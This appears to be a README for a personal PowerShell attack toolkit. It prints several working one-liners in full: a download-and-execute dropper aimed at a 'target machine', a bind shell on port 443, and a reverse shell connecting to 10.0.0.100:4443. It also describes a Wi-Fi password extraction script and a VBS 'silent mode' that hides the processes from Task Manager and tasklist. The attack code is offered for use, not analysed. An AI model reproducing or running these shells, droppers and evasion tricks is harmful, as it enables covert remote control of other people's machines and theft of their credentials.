###### PS>           
#
# 𝖕𝖔𝖜𝖊𝖗𝖘𝖍𝖊𝖑𝖑 v0.1
#
>you can use the following command on the target machine to execute scripts
````powershell
#powerhsell dropper
(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('URL')|iex

````
## *Silent mode*

Al of the scripts posted in the repository have a Silent mode script (.vbs) thats wrote in visual basic. To run the powershell scripts in silent mode download both the .ps1 and .vbs script sand run the .vbs one(i will probably make it easier to do this but it works for the moment especially because it doesnt show up in task manager or with tasklist (can still kill the task and the connection is shown in netstsat in case of the two shells);

#

***wifiscr*** (contains code for extracting wifi passwords)

***bindscr*** (contains code for a simple bind shell)

one liner version:

````powershell

$listener = [System.Net.Sockets.TcpListener]443;$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()


````
***revscr*** (contains code for an interactive reverse shell)

## Powershell reverse shell one-liner by Nikhil SamratAshok Mittal @samratashok 

````powerhsell
$client = New-Object System.Net.Sockets.TCPClient('10.0.0.100',4443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PSReverseShell# ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();
````

really cool project(love the obfuscation method) credits to ivan-sincek
##
**_most of the scripts here are edited from original releases down below_**
#
###### *_wifiscr.ps_1* [link](https://gist.github.com/Saturate/fe58d57db4db36b0dfb40b9ab07efa65)

###### *_bindscr.ps1_* [link](https://github.com/samratashok/nishang)

###### *_revscr.ps1_* [link](https://github.com/ivan-sincek/powershell-reverse-tcp)

## future actions

- [x] upload version 0.1
- [ ] build more scripts 
- [ ] collab?
- [ ] upload 1.0 alpha 

#### *_if you have any suggestions I am happy to listen_*

>xze3n.py@gmail.com
